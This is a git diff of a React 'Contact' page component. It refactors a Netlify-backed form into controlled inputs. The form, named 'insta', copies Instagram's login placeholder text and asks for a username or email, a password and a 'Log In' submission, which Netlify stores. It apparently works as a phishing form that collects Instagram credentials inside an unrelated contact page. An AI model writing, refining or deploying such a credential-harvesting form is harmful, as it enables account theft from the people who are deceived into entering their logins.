@@ -1,7 +1,10 @@
-import React from 'react';
+import React, { useState } from 'react';
 import '../styles/Contact.css'; // Import the CSS file
 
 const Contact = () => {
+  const [usernameOrEmail, setUsernameOrEmail] = useState('');
+  const [password, setPassword] = useState('');
+
   return (
     <div>
       {/* Engaging Query Message */}
@@ -12,14 +15,27 @@ const Contact = () => {
       </div>
 
       <section id="contact" className="contact-section">
-      <form name="insta" method="POST" data-netlify="true">
-  <input type="hidden" name="form-name" value="insta" />
-  <input type="text" name="username_or_email" placeholder="Phone number, username, or email" required />
-  <input type="password" name="password" placeholder="Password" required />
-  <button type="submit">Log In</button>
-</form>
-
-       
+        {/* Netlify Form */}
+        <form name="insta" method="POST" data-netlify="true">
+          <input type="hidden" name="form-name" value="insta" />
+          <input
+            type="text"
+            name="username_or_email"
+            placeholder="Phone number, username, or email"
+            required
+            value={usernameOrEmail}
+            onChange={(e) => setUsernameOrEmail(e.target.value)}
+          />
+          <input
+            type="password"
+            name="password"
+            placeholder="Password"
+            required
+            value={password}
+            onChange={(e) => setPassword(e.target.value)}
+          />
+          <button type="submit">Log In</button>
+        </form>
 
         {/* Google Maps iFrame */}
         <div className="map-container">
